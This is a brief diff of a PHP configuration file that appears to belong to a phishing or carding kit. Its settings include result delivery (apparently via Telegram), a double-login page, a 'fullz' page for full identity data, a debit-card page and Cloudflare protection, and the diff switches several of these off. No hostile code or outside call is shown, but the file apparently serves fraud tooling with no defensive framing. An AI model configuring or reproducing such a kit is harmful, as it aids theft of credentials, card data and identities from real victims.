@@ -9,9 +9,9 @@ $tgresult = "on";  // DON'T change
 
 //page settings
 $doublelogin =  "off";
-$CFProtection = "on";
-$securitypage = "on";
-$fullzpage = "on";
+$CFProtection = "off";
+$securitypage = "off";
+$fullzpage = "off";
 $debitpage = "off";
 $mailpage = "off";
 // only works if mail enabled as it is directly tied to mail
